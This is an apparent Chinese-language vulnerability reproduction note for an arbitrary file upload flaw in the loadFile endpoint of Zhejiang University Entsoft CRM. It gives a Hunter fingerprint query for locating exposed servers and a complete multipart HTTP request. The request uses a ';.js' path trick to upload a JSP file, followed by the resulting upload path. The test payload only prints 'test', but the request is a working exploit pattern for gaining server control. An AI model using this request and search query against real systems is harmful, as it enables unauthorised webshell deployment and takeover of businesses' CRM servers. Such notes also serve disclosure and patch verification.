# 浙大恩特CRM loadFile任意文件上传漏洞

# 一、漏洞简介
<font style="color:rgba(0, 0, 0, 0.9);">浙大恩特CRM是由浙江大学恩智浙大科技有限公司推出的客户关系管理（CRM）系统。该系统旨在帮助企业高效管理客户关系，提升销售业绩，促进市场营销和客户服务的优化。系统支持客户数据分析和报表展示，帮助企业深度挖掘客户数据，提供决策参考。浙大恩特CRM loadFile存在任意文件上传漏洞，攻击者可通过该漏洞获取服务器控制权限。</font>

# <font style="color:rgba(0, 0, 0, 0.9);">二、影响版本</font>
+ <font style="color:rgba(0, 0, 0, 0.9);">浙大恩特CRM</font>

# <font style="color:rgba(0, 0, 0, 0.9);">三、资产测绘</font>
+ hunter`app.name="浙大恩特 CRM"`
+ 特征

![1700034640158-a0b751ed-9499-471d-aef1-96b75913aa5a.png](./img/-A0quRyHPliStmt2/1700034640158-a0b751ed-9499-471d-aef1-96b75913aa5a-135267.png)

# 四、漏洞复现
```plain
POST /entsoft/CustomerAction.entphone;.js?method=loadFile HTTP/1.1
Host: xx.xx.xx.xx
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/112.0  uacq
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarye8FPHsIAq9JN8j2A
Content-Length: 203

------WebKitFormBoundarye8FPHsIAq9JN8j2A
Content-Disposition: form-data; name="file";filename="as.jsp"
Content-Type: image/jpeg

<%out.print("test");%>
------WebKitFormBoundarye8FPHsIAq9JN8j2A--
```

![1700034671160-eec58ac8-f06c-4a3d-ab89-760a691e1eb2.png](./img/-A0quRyHPliStmt2/1700034671160-eec58ac8-f06c-4a3d-ab89-760a691e1eb2-488996.png)

根据响应可知上传文件位置

```plain
  /enterdoc/gesnum/00003509/photo/as.jsp
```

![1700034711122-37b79faa-ab5b-4d49-88d2-1a76bab4f5a7.png](./img/-A0quRyHPliStmt2/1700034711122-37b79faa-ab5b-4d49-88d2-1a76bab4f5a7-729649.png)



> 更新: 2024-02-29 23:55:45  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/emyt65hk122k6rpq>